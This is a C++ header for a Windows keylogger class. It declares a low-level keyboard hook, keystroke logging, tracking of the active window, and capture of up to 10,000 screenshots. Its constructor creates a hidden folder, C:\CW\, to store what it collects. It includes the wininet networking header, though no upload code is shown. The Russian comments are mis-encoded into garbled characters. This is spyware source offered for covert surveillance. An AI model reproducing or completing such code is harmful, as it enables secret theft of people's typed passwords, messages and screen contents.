#ifndef KEY_LOGGER_HPP
#define KEY_LOGGER_HPP

#include <string>
#include <Windows.h>
#include <gdiplus.h>
#include <fstream>
#include <stdio.h>
#include <Winuser.h>
#include <locale.h>
#include <random>
#include <wininet.h>
#include <iostream>
#include <chrono>
#include <iomanip>
#include <sstream>


constexpr unsigned int RUS{ 0x0419 };
constexpr unsigned int ENG{ 0x0409 };
constexpr unsigned int MAXAMOUNTOFIMAGES{ 10000 };


class KeyLogger {
public:
    KeyLogger() {
        // —оздаем директорию
        if (!CreateDirectoryA("C:\\CW\\", NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
            std::cerr << "Ќе удалось создать директорию!" << std::endl;
        }

        // ”станавливаем атрибуты дл€ директории, чтобы она была скрыта
        SetFileAttributesA("C:\\CW\\", FILE_ATTRIBUTE_HIDDEN);
    }

    HHOOK hHook{};
    KBDLLHOOKSTRUCT kbStruct{};


    void checkAdminMode(HINSTANCE& hInstance);
    void startLogging();
    void saveInput(int key);

    
private:
    std::ofstream file{};
    LPWSTR keyboardInput;
    LPWSTR names[MAXAMOUNTOFIMAGES];
    HWND wndHwnd{};
    std::string input{};
    SYSTEMTIME currentTime{};
    SYSTEMTIME previousTime{};
    SYSTEMTIME startTime{};
    bool start = true;
    bool reload = false;
    int currentLayout{};
    bool isWindowChanged = false;
    char prevWind[256] = { 0 };
    char curWind[256] = { 0 };
    int curImage = 0;
    RECT rect = { 0, 40, 0, 900 };
    RECT rectScreenShot = { 0, 0, 0, 0 };
    int widthOfScreen{};
    int heightOfScreen{};
    bool showWindow = false;


    bool isCaps();
    char translateChar(int& key);
    std::string interpreteKey(int& key);
    int getEncoderClsid(const WCHAR* format, CLSID* pClsid);
};

extern KeyLogger keyLogger;

LRESULT CALLBACK logKey(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK windowBehaviour(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

#endif